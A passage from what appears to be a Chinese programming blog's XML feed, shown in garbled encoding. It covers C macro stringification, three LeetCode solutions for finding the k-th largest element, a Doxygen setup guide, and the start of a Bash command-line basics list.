class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (n &gt; <span class="hljs-number">0</span>)<br>    device_init_wakeup(d, v);<br><span class="hljs-keyword">else</span><br>    <span class="hljs-keyword">continue</span>;<br></code></pre></td></tr></table></figure></li></ul><h2 id="ã€-ã€å¯å˜å‚æ•°"><a href="#ã€-ã€å¯å˜å‚æ•°" class="headerlink" title="#ã€##ã€å¯å˜å‚æ•°"></a>#ã€##ã€å¯å˜å‚æ•°</h2><ul><li>å¯¹äºå‡½æ•°å¼å®ï¼Œ#å¯ä»¥å°†å‚æ•°è½¬æ¢ä¸ºå­—ç¬¦ä¸²ï¼ˆå¹¶éç®€å•çš„åŠ â€œâ€ï¼Œè¿™é‡Œå·²ç»è¿‡è½¬ä¹‰ï¼‰</li><li>##å¯ä»¥ç”¨äºä¸Šé¢ä¸¤ç§å®ï¼Œå¯ä»¥å°†å‰åä¸¤ä¸ªé¢„å¤„ç†Tokenè¿æ¥æˆä¸€ä¸ªé¢„å¤„ç†Token</li><li><code>#define showlist(...) printf(#__VA_ARGS__)</code><ul><li>â€¦è¡¨ç¤ºå¯å˜å‚æ•°ï¼Œä¸Šé¢å®å±•å¼€åä¸º<code>printf(&quot;The first, second, and third items.&quot;);</code></li><li>åœ¨å®å®šä¹‰ä¸­ï¼Œå¯å˜å‚æ•°çš„éƒ¨åˆ†ç”¨__VA_ARGS__è¡¨ç¤º</li></ul></li></ul>]]></content>
    
    
    <categories>
      
      <category>Cè¯­è¨€</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Cè¯­è¨€</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>å¤§å‚ç®—æ³•HOT100é¢˜â€”â€”æ•°ç»„ä¸­çš„ç¬¬Kä¸ªæœ€å¤§å…ƒç´ </title>
    <link href="/p/68c3bbb2/"/>
    <url>/p/68c3bbb2/</url>
    
    <content type="html"><![CDATA[<p>ç”±äºæœ€è¿‘å®åœ¨æ˜¯å¤ªé—²äº†ï¼Œæ‰€ä»¥å‡†å¤‡æŠŠå¤§å‚ç®—æ³•HOT100é¢˜åˆ·ä¸€éï¼ŒæŒç»­æ›´æ–°</p><h1 id="æ•°ç»„ä¸­çš„ç¬¬Kä¸ªæœ€å¤§å…ƒç´ "><a href="#æ•°ç»„ä¸­çš„ç¬¬Kä¸ªæœ€å¤§å…ƒç´ " class="headerlink" title="æ•°ç»„ä¸­çš„ç¬¬Kä¸ªæœ€å¤§å…ƒç´ "></a>æ•°ç»„ä¸­çš„ç¬¬Kä¸ªæœ€å¤§å…ƒç´ </h1><p><strong>LeetCodeåŸé¢˜è¿æ¥</strong>ï¼š<a href="https://leetcode-cn.com/problems/kth-largest-element-in-an-array/">æ•°ç»„ä¸­çš„ç¬¬Kä¸ªæœ€å¤§å…ƒç´ </a></p><hr><h2 id="é¢˜æ„ï¼š"><a href="#é¢˜æ„ï¼š" class="headerlink" title="é¢˜æ„ï¼š"></a>é¢˜æ„ï¼š</h2><p>ç»™å®šæ•´æ•°æ•°ç»„ nums å’Œæ•´æ•° kï¼Œè¯·è¿”å›æ•°ç»„ä¸­ç¬¬ k ä¸ªæœ€å¤§çš„å…ƒç´ ã€‚</p><p>è¯·æ³¨æ„ï¼Œä½ éœ€è¦æ‰¾çš„æ˜¯æ•°ç»„æ’åºåçš„ç¬¬ k ä¸ªæœ€å¤§çš„å…ƒç´ ï¼Œè€Œä¸æ˜¯ç¬¬ k ä¸ªä¸åŒçš„å…ƒç´ ã€‚</p><h2 id="æ€è·¯ä¸€ï¼šå¿«é€Ÿæ’åº"><a href="#æ€è·¯ä¸€ï¼šå¿«é€Ÿæ’åº" class="headerlink" title="æ€è·¯ä¸€ï¼šå¿«é€Ÿæ’åº"></a>æ€è·¯ä¸€ï¼šå¿«é€Ÿæ’åº</h2><p>æ‰‹å†™å¿«æ’ï¼Œè¿”å›<code>nums[k-1]</code>å³å¯</p><p><a href="https://blog.csdn.net/weixin_43864567/article/details/113753440">ä¸‰åˆ†é’Ÿå­¦ä¼šå¿«é€Ÿæ’åºï¼ˆå›¾ç¤ºè®²è§£ï¼Œé™„ä»£ç ï¼Œé€šä¿—æ˜“æ‡‚ï¼‰</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span> &#123;</span><br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">quick_sort</span><span class="hljs-params">(<span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt; &amp;nums,<span class="hljs-keyword">int</span> l,<span class="hljs-keyword">int</span> r)</span></span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(l&gt;=r) <span class="hljs-keyword">return</span> ;<br>        <span class="hljs-keyword">int</span> x=nums[(l+r)/<span class="hljs-number">2</span>],i=l<span class="hljs-number">-1</span>,j=r+<span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">while</span>(i&lt;j)<br>        &#123;<br>            <span class="hljs-keyword">do</span> i++; <span class="hljs-keyword">while</span>(nums[i]&gt;x);<br>            <span class="hljs-keyword">do</span> j--; <span class="hljs-keyword">while</span>(nums[j]&lt;x);<br>            <span class="hljs-keyword">if</span>(i&lt;j) swap(nums[i],nums[j]);<br>        &#125;<br>        quick_sort(nums,l,j),quick_sort(nums,j+<span class="hljs-number">1</span>,r);        <br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">findKthLargest</span><span class="hljs-params">(<span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt;&amp; nums, <span class="hljs-keyword">int</span> k)</span> </span>&#123;<br>        quick_sort(nums,<span class="hljs-number">0</span>,nums.size()<span class="hljs-number">-1</span>);<br>        <span class="hljs-keyword">return</span> nums[k<span class="hljs-number">-1</span>];<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="æ€è·¯äºŒï¼šä¼˜åŒ–åçš„å¿«æ’ç®—æ³•"><a href="#æ€è·¯äºŒï¼šä¼˜åŒ–åçš„å¿«æ’ç®—æ³•" class="headerlink" title="æ€è·¯äºŒï¼šä¼˜åŒ–åçš„å¿«æ’ç®—æ³•"></a>æ€è·¯äºŒï¼šä¼˜åŒ–åçš„å¿«æ’ç®—æ³•</h2><p>è¯¥ä¼˜åŒ–åŸºäºä»¥ä¸‹åŸç†ï¼š</p><ul><li>å‡è‹¥å·¦è¾¹æ•°å­—çš„ä¸ªæ•°å¤§äºç­‰äºkï¼Œé‚£ä¹ˆè¦æ‰¾çš„å€¼å¿…åœ¨å·¦è¾¹ï¼Œå› æ­¤åªéœ€å¯¹å·¦è¾¹è¿›è¡Œé€’å½’æ’åº</li><li> å‡è‹¥å·¦è¾¹æ•°å­—çš„ä¸ªæ•°å°äºç­‰äºkï¼Œé‚£ä¹ˆè¦æ‰¾çš„å€¼å¿…åœ¨å³è¾¹ï¼Œå› æ­¤åªéœ€å¯¹å³è¾¹è¿›è¡Œé€’å½’æ’åº</li></ul><p>å› æ­¤ï¼Œå¯ä»¥å°†ä¸¤æ¬¡çš„<code>quick_sort</code>è°ƒç”¨ä¼˜åŒ–ä¸ºä¸€æ¬¡ï¼Œä»è€Œé™ä½æ ˆå†…å­˜çš„ä½¿ç”¨ç‡</p><p>å…·ä½“å¯ä»¥å‚è€ƒï¼š</p><p><a href="https://blog.csdn.net/weixin_43864567/article/details/116158100?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522164016650816780255279049%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&request_id=164016650816780255279049&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-2-116158100.nonecase&utm_term=%E5%BF%AB%E9%80%9F&spm=1018.2226.3001.4450">å¯¹å¿«é€Ÿæ’åºè¿›è¡Œå°¾é€’å½’ä¼˜åŒ–</a><br><img src="https://gls.show/images/uploads/big/7ee8350fd674f632b242f6a49989a727.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span> &#123;</span><br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">quick_sort</span><span class="hljs-params">(<span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt;&amp; nums,<span class="hljs-keyword">int</span> l,<span class="hljs-keyword">int</span> r,<span class="hljs-keyword">int</span> k)</span></span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(l==r) <span class="hljs-keyword">return</span> nums[k];<br>        <span class="hljs-keyword">int</span> x=nums[(l+r)/<span class="hljs-number">2</span>],i=l<span class="hljs-number">-1</span>,j=r+<span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">while</span>(i&lt;j)<br>        &#123;<br>            <span class="hljs-keyword">do</span> i++;<span class="hljs-keyword">while</span>(nums[i]&gt;x);<br>            <span class="hljs-keyword">do</span> j--;<span class="hljs-keyword">while</span>(nums[j]&lt;x);<br>            <span class="hljs-keyword">if</span>(i&lt;j) swap(nums[i],nums[j]);<br>        &#125;<br>        <span class="hljs-comment">//int sum=j-l+1;</span><br>        <span class="hljs-keyword">if</span>(k&lt;=j) quick_sort(nums,l,j,k);<br>        <span class="hljs-keyword">else</span> quick_sort(nums,j+<span class="hljs-number">1</span>,r,k);<br>        <span class="hljs-keyword">return</span> nums[k];<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">findKthLargest</span><span class="hljs-params">(<span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt;&amp; nums, <span class="hljs-keyword">int</span> k)</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> quick_sort(nums,<span class="hljs-number">0</span>,nums.size()<span class="hljs-number">-1</span>,k<span class="hljs-number">-1</span>);<br>        <br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="æ€è·¯ä¸‰ï¼šå€ŸåŠ©priority-queue"><a href="#æ€è·¯ä¸‰ï¼šå€ŸåŠ©priority-queue" class="headerlink" title="æ€è·¯ä¸‰ï¼šå€ŸåŠ©priority_queue"></a>æ€è·¯ä¸‰ï¼šå€ŸåŠ©<code>priority_queue</code></h2><p>ç»´æŠ¤ä¸€ä¸ªå¤§å°ä¸ºkçš„å°æ ¹å †ï¼Œéå†æ•°ç»„numsä¸­æ‰€æœ‰å…ƒç´ ä¹‹åï¼Œ<code>q.top()</code>å³ä¸ºæ‰€æ±‚</p><p>ç®—æ³•å¤æ‚åº¦ï¼š$O(nlog(k))$</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span> &#123;</span><br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">findKthLargest</span><span class="hljs-params">(<span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt;&amp; nums, <span class="hljs-keyword">int</span> k)</span> </span>&#123;<br>        <span class="hljs-built_in">priority_queue</span>&lt;<span class="hljs-keyword">int</span>,<span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt;,greater&lt;<span class="hljs-keyword">int</span>&gt;&gt; q;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">auto</span> x:nums)<br>        &#123;<br>            q.push(x);<br>            <span class="hljs-keyword">if</span>(q.size()&gt;k) q.pop();<br>        &#125;<br>        <span class="hljs-keyword">return</span> q.top();<br>    &#125;<br>&#125;;<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>leetcode</category>
      
    </categories>
    
    
    <tags>
      
      <tag>leetcode</tag>
      
      <tag>ç®—æ³•</tag>
      
      <tag>åˆ·é¢˜</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ä½¿ç”¨Doxygenä»æºç ä¸­è‡ªåŠ¨ç”Ÿæˆæ–‡æ¡£</title>
    <link href="/p/638b5d0d/"/>
    <url>/p/638b5d0d/</url>
    
    <content type="html"><![CDATA[<h2 id="Doxygen-æ˜¯ä¸ªä»€ä¹ˆç‰›é©¬-ï¼Ÿ"><a href="#Doxygen-æ˜¯ä¸ªä»€ä¹ˆç‰›é©¬-ï¼Ÿ" class="headerlink" title="Doxygen æ˜¯ä¸ªä»€ä¹ˆç‰›é©¬ ï¼Ÿ"></a>Doxygen æ˜¯ä¸ªä»€ä¹ˆç‰›é©¬ ï¼Ÿ</h2><hr><p>Doxygenæ˜¯ä¸€æ¬¾æ–‡æ¡£ç”Ÿæˆå·¥å…·ï¼Œå®ƒå¯ä»¥ä»å¸¦æœ‰æ³¨é‡Šçš„ä»£ç ä¸­æå–å‡ºå…³é”®ä¿¡æ¯ï¼Œå¹¶ä¸€é”®ç”Ÿæˆå„ç§æ–‡æ¡£æ ¼å¼ï¼ˆæ”¯æŒçš„æ–‡æ¡£æ ¼å¼æœ‰ï¼šLaTeXã€HTMLï¼ŒPDFï¼ŒRTFã€XMLã€Docbookã€Manpageç­‰ï¼‰ã€‚åªè¦ä½ çš„ä»£ç æ³¨é‡Šç¬¦åˆæ ‡å‡†ï¼Œé‚£ä¹ˆå½“ä½ ä»£ç æ•²å®Œçš„æ—¶å€™ï¼Œæ–‡æ¡£å·²ç»éƒ¨ç½²å®Œæˆäº†</p><p>Doxygenä¸ä»…ä»…å¯ä»¥ä½œä¸ºæ–‡æ¡£ï¼Œè¿˜å¯ä»¥ä½œä¸ºå¤§å‹é¡¹ç›®çš„åˆ†ææ‰‹æ®µã€‚å®ƒå¯ä»¥ç”Ÿæˆå‡½æ•°è°ƒç”¨ï¼Œä»è€Œå¸®åŠ©ç†è§£ç¨‹åºçš„é€»è¾‘å…³ç³»ã€‚</p><p><strong>æ”¯æŒçš„è¯­è¨€ï¼š</strong></p><ul><li>Cã€Objective-Cã€C#ã€PHPã€Javaã€Pythonã€IDLï¼ˆCorbaã€Microsoft å’Œ UNO/OpenOffice é£æ ¼ï¼‰ )ã€Fortranã€VHDL ä»¥åŠåœ¨æŸç§ç¨‹åº¦ä¸Š D</li></ul><p><strong>æ”¯æŒå¹³å°ï¼š</strong></p><ul><li>Windows</li><li>Linux</li><li>Mac OS X </li><li>å¤šæ•°Unixå‘è¡Œç‰ˆæœ¬</li></ul><p><strong>æ•ˆæœå›¾ï¼šï¼ˆä»¥HTMLæ–‡æ¡£ä¸ºä¾‹ï¼‰</strong></p><ul><li>æ–‡æ¡£<br><img src="https://img-blog.csdnimg.cn/75318f67c68e4cff8f3b7b54e955e657.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6YOt5ZCM5a2m5aaC5piv6K-0,size_20,color_FFFFFF,t_70,g_se,x_16"></li></ul><ul><li>å‡½æ•°è°ƒç”¨å…³ç³»<ul><li>æ¯ä¸ªå‡½æ•°éƒ½æ˜¯è¶…é“¾æ¥ï¼Œå¯ä»¥ç‚¹è¿›å»ï¼Œè·³è½¬åˆ°å¯¹åº”çš„æ–‡æ¡£é¡µé¢<br><img src="https://img-blog.csdnimg.cn/4ff267974d3f4d519695858981ced12b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6YOt5ZCM5a2m5aaC5piv6K-0,size_20,color_FFFFFF,t_70,g_se,x_16"></li></ul></li></ul><ul><li>å‡½æ•°<br><img src="https://img-blog.csdnimg.cn/6a7e12869fb341f0b52d84922e5acf4c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6YOt5ZCM5a2m5aaC5piv6K-0,size_20,color_FFFFFF,t_70,g_se,x_16"></li></ul><p>Doxygençš„æ–‡æ¡£åŠŸèƒ½ååˆ†å¼ºå¤§ï¼Œæ›´å¤šçš„é¡µé¢åœ¨æ­¤ä¸ä¸€ä¸€åˆ—ä¸¾ï¼Œè¯»è€…å¯ä»¥è‡ªè¡Œæ¢ç´¢ã€‚</p><h2 id="Doxygen-çš„å®‰è£…"><a href="#Doxygen-çš„å®‰è£…" class="headerlink" title="Doxygen çš„å®‰è£…"></a>Doxygen çš„å®‰è£…</h2><hr><p>æ‰“å¼€<a href="https://www.doxygen.nl/download.html">å®˜ç½‘</a>ï¼Œé€‰æ‹©å¯¹åº”çš„æ“ä½œç³»ç»Ÿç‰ˆæœ¬å³å¯</p><p>å¯¹äºLinuxç‰ˆæœ¬ï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨<code>sudo apt install doxygen-gui</code>å‘½ä»¤å®‰è£…</p><p><img src="https://img-blog.csdnimg.cn/1dae7f5600ea44829b895f7bc1de834d.png"></p><h2 id="Doxygen-çš„ä½¿ç”¨"><a href="#Doxygen-çš„ä½¿ç”¨" class="headerlink" title="Doxygen çš„ä½¿ç”¨"></a>Doxygen çš„ä½¿ç”¨</h2><hr><p>åœ¨å‘½ä»¤è¡Œä¸­è¾“å…¥doxywizardä¼šå‡ºç°doxygençš„guiçª—å£ï¼Œå½“ç„¶ä½ å¯ä»¥ä½¿ç”¨å‘½ä»¤è¡Œæ“ä½œ</p><blockquote><p>ä»¥æˆ‘æ‰€ä½¿ç”¨çš„Linuxç³»ç»Ÿçš„Doxygenä¸ºä¾‹</p></blockquote><p><strong>æ‰“å¼€è½¯ä»¶åï¼Œé…ç½®Doxygené¡¹ç›®ï¼š</strong></p><ul><li>æŒ‡å®šå·¥ä½œè·¯å¾„</li><li>æŒ‡å®šæ–‡æ¡£åç§°ã€ç‰ˆæœ¬å·ã€æºç è·¯å¾„ã€æ–‡æ¡£è·¯å¾„ç­‰ä¿¡æ¯</li><li>å¦‚ä¸‹å›¾æ‰€ç¤º</li></ul><p><img src="https://img-blog.csdnimg.cn/e1f39c7bfdf0479cb3bdd312688cf928.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6YOt5ZCM5a2m5aaC5piv6K-0,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p><p><strong>é…ç½®modeï¼š</strong></p><p><img src="https://img-blog.csdnimg.cn/114102737b9a4cf49023d2a27d9ddc45.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6YOt5ZCM5a2m5aaC5piv6K-0,size_20,color_FFFFFF,t_70,g_se,x_16"></p><p><strong>é…ç½®outputï¼š</strong></p><p><img src="https://img-blog.csdnimg.cn/d54958942ee24ba79e20b495dc4e768f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6YOt5ZCM5a2m5aaC5piv6K-0,size_20,color_FFFFFF,t_70,g_se,x_16" alt="&lt;img src=&quot;image/image-20220101173547950.png&quot; alt=&quot;image-20220101173547950&quot; style=&quot;zoom: 80%;&quot; /&gt;"></p><p><strong>é…ç½®diagramï¼š</strong></p><p>æ­¤å¤„éœ€è¦å®‰è£…graphviz</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">apt-<span class="hljs-builtin-name">get</span> install doxygen graphviz<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/d126fd0c331b45ddb4deb976cb7c0fd6.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6YOt5ZCM5a2m5aaC5piv6K-0,size_20,color_FFFFFF,t_70,g_se,x_16"></p><p><strong>åœ¨experté€‰é¡¹ä¸­ï¼Œå¯ä»¥é…ç½®æ›´å¤šçš„ç»†èŠ‚ï¼š</strong></p><p><img src="https://img-blog.csdnimg.cn/a5d3c78e83844bbfa4449763c4f21d0c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6YOt5ZCM5a2m5aaC5piv6K-0,size_20,color_FFFFFF,t_70,g_se,x_16"></p><p><strong>æœ€åï¼Œç‚¹å‡»runå³å¯ç”Ÿæˆæ–‡æ¡£</strong></p><p><img src="https://img-blog.csdnimg.cn/09c7cbb8a779452a901cdcbc91263ab6.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6YOt5ZCM5a2m5aaC5piv6K-0,size_20,color_FFFFFF,t_70,g_se,x_16"></p><h2 id="æ›´å¤šä¿¡æ¯"><a href="#æ›´å¤šä¿¡æ¯" class="headerlink" title="æ›´å¤šä¿¡æ¯"></a>æ›´å¤šä¿¡æ¯</h2><p>å¯ä»¥è®¿é—®å®˜ç½‘æŸ¥çœ‹ï¼š<a href="https://www.doxygen.nl/index.html">https://www.doxygen.nl/index.html</a></p>]]></content>
    
    
    <categories>
      
      <category>å·¥å…·ä½¿ç”¨</category>
      
    </categories>
    
    
    <tags>
      
      <tag>è½¯ä»¶</tag>
      
      <tag>å·¥å…·</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>å‘½ä»¤è¡Œçš„è‰ºæœ¯</title>
    <link href="/p/6aa1f673/"/>
    <url>/p/6aa1f673/</url>
    
    <content type="html"><![CDATA[<p><img src="/image/1654102693071.png">  </p><h1 id="åŸºç¡€"><a href="#åŸºç¡€" class="headerlink" title="åŸºç¡€"></a>åŸºç¡€</h1><ul><li>å­¦ä¹  Bash çš„åŸºç¡€çŸ¥è¯†<ul><li>é˜…è¯»<code>man bash</code>æˆ–è€…<code>tldr bash</code></li><li>ä¸€äº›åˆ«çš„shellï¼šzshã€fish</li><li>äº†è§£bashå†…ç½®å‘½ä»¤</li></ul></li><li>æ–‡æœ¬ç¼–è¾‘å™¨<ul><li>ä½¿ç”¨vimã€EMACSåœ¨ç»ˆç«¯ç¼–è¾‘æ–‡æœ¬</li></ul></li><li>æ–‡æ¡£<ul><li>man</li><li>tldr</li><li>apropos</li><li>ä½¿ç”¨helpè·å–å¸®åŠ©ä¿¡æ¯</li></ul></li><li>è¾“å…¥è¾“å‡ºé‡å®šå‘<ul><li>ä½¿ç”¨ &gt; å’Œ &lt; æ¥é‡å®šå‘è¾“å‡ºå’Œè¾“å…¥</li><li>ä½¿ç”¨ | æ¥é‡å®šå‘ç®¡é“</li><li>&gt; ä¼šè¦†ç›–äº†è¾“å‡ºæ–‡ä»¶è€Œ &gt;&gt; æ˜¯åœ¨æ–‡ä»¶æœ«æ·»åŠ </li><li>æ ‡å‡†è¾“å‡º stdout </li><li>æ ‡å‡†é”™è¯¯ stderr</li></ul></li><li>bashä»»åŠ¡ç®¡ç†å·¥å…·<ul><li>&amp;ï¼šå°†ä»»åŠ¡æ”¾åœ¨åå°æ‰§è¡Œ</li><li>ctrl+cï¼šç»ˆæ­¢ç¨‹åº</li><li>ctrl+zï¼šæŒ‚èµ·ç¨‹åºï¼ˆé…åˆfgã€bgå‘½ä»¤ä½¿ç”¨ï¼‰</li><li>ctrl+dï¼šç»ˆæ­¢è¾“å…¥/é€€å‡ºç»ˆç«¯</li><li>ctrl-lï¼šæ¸…å±</li><li>jobs</li></ul></li><li>ssh è¿›è¡Œè¿œç¨‹å‘½ä»¤è¡Œç™»å½•<ul><li>æ— å¯†ç è®¤è¯ç™»å½•<ul><li>eval $(ssh-agent)</li><li>ssh-add ~/.ssh/ç§é’¥</li><li>åœ¨configæ–‡ä»¶ä¸­å¯ä»¥æŒ‡å®šä¸€äº›é€‰é¡¹ï¼Œæ¯”å¦‚TCPKeepAlive=yesï¼ŒServerAliveInterval=15ç­‰</li></ul></li></ul></li><li>æ–‡ä»¶ç®¡ç†å·¥å…·<ul><li>ls -læ¯ä¸€åˆ—çš„æ„ä¹‰</li><li>æŸ¥çœ‹æ–‡ä»¶å†…å®¹   <ul><li>less</li><li>tail</li><li>head</li><li>ç¡¬é“¾æ¥ä¸è½¯è¿æ¥</li><li>chownæ”¹å˜æ–‡ä»¶çš„æ‰€æœ‰è€…/ç»„ã€chmodæ”¹å˜æƒé™</li><li><code>du -hs *</code>è·å–ç£ç›˜ä½¿ç”¨æƒ…å†µæ¦‚è¿°ï¼Œsè¡¨ç¤ºsingle dictionaryï¼Œhè¡¨ç¤ºhuman-readable form</li><li>duï¼šdisk usage</li><li>dfï¼šdisk filesystem</li></ul></li></ul></li><li>åŸºæœ¬çš„ç½‘ç»œç®¡ç†å·¥å…·<ul><li>ip</li><li>ifconfig</li></ul></li><li>ç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿ<ul><li>git</li></ul></li><li>æ­£åˆ™è¡¨è¾¾å¼<ul><li>grep</li><li>egrep</li><li>ç†Ÿæ‚‰ä¸Šé¢å‘½ä»¤çš„-iï¼Œ-oï¼Œ-vï¼Œ-Aï¼Œ-B å’Œ -Cå‚æ•°</li></ul></li><li>åŒ…ç®¡ç†å·¥å…·<ul><li>å­¦ä¼šä½¿ç”¨ apt-getï¼Œyumï¼Œdnf æˆ– pacmanæ¥æŸ¥æ‰¾å’Œå®‰è£…è½¯ä»¶åŒ…</li><li>pip æ¥å®‰è£…åŸºäº Python çš„å‘½ä»¤è¡Œå·¥å…·</li></ul></li></ul><h1 id="æ—¥å¸¸ä½¿ç”¨"><a href="#æ—¥å¸¸ä½¿ç”¨" class="headerlink" title="æ—¥å¸¸ä½¿ç”¨"></a>æ—¥å¸¸ä½¿ç”¨</h1><ul><li>Tab é”®å®ç°è‡ªåŠ¨è¡¥å…¨å‚æ•°</li><li>ctrl-r æœç´¢å‘½ä»¤è¡Œå†å²è®°å½•<ul><li>æŒ‰ä¸‹ Enter é”®ä¼šæ‰§è¡Œå½“å‰åŒ¹é…çš„å‘½ä»¤</li><li>æŒ‰ä¸‹å³æ–¹å‘é”®ä¼šå°†åŒ¹é…é¡¹æ”¾å…¥å½“å‰è¡Œä¸­ï¼Œä¸ä¼šç›´æ¥æ‰§è¡Œï¼Œä»¥ä¾¿åšå‡ºä¿®æ”¹</li></ul></li><li>å‘½ä»¤ä¿®æ”¹<ul><li>ctrl-w åˆ é™¤ä½ é”®å…¥çš„æœ€åä¸€ä¸ªå•è¯</li><li>ctrl-u å¯ä»¥åˆ é™¤è¡Œå†…å…‰æ ‡æ‰€åœ¨ä½ç½®ä¹‹å‰çš„å†…å®¹</li><li>alt-b å’Œ alt-f å¯ä»¥ä»¥å•è¯ä¸ºå•ä½ç§»åŠ¨å…‰æ ‡</li><li>ctrl-a å¯ä»¥å°†å…‰æ ‡ç§»è‡³è¡Œé¦–</li><li>ctrl-e å¯ä»¥å°†å…‰æ ‡ç§»è‡³è¡Œå°¾</li><li>ctrl-k å¯ä»¥åˆ é™¤å…‰æ ‡è‡³è¡Œå°¾çš„æ‰€æœ‰å†…å®¹</li><li>ctrl-l å¯ä»¥æ¸…å±</li><li>é”®å…¥ man readline å¯ä»¥æŸ¥çœ‹ Bash ä¸­çš„é»˜è®¤å¿«æ·é”®</li></ul></li><li>pstree -p ä»¥ä¸€ç§ä¼˜é›…çš„æ–¹å¼å±•ç¤ºè¿›ç¨‹æ ‘</li><li>å›åˆ°å‰ä¸€ä¸ªå·¥ä½œè·¯å¾„ï¼šcd -</li><li>Alt . :ä¸Šä¸€ä¸ªå‘½ä»¤</li><li>ä½¿ç”¨ pgrep å’Œ pkill æ ¹æ®åå­—æŸ¥æ‰¾è¿›ç¨‹æˆ–å‘é€ä¿¡å·</li><li>äº†è§£å‘å¾€è¿›ç¨‹çš„ä¿¡å·çš„ç§ç±»<ul><li>man 7 signal</li></ul></li><li>disown å¯ä»¥ä½¿ä¸€ä¸ªåå°è¿›ç¨‹æŒç»­è¿è¡Œï¼Œè¿™æ ·å…³é—­shellçš„æ—¶å€™è¿›ç¨‹å°±ä¸ä¼šè¢«ç»ˆæ­¢</li><li>wæŸ¥çœ‹ç™»å½•ç”¨æˆ·å’Œå·²ç»è¿è¡Œæ—¶é—´</li><li>uptimeæŸ¥çœ‹å·²ç»è¿è¡Œæ—¶é—´</li><li>ä½¿ç”¨ alias æ¥åˆ›å»ºå¸¸ç”¨å‘½ä»¤çš„å¿«æ·å½¢å¼</li><li>diffï¼šé€è¡Œæ¯”è¾ƒæ–‡ä»¶</li><li>man 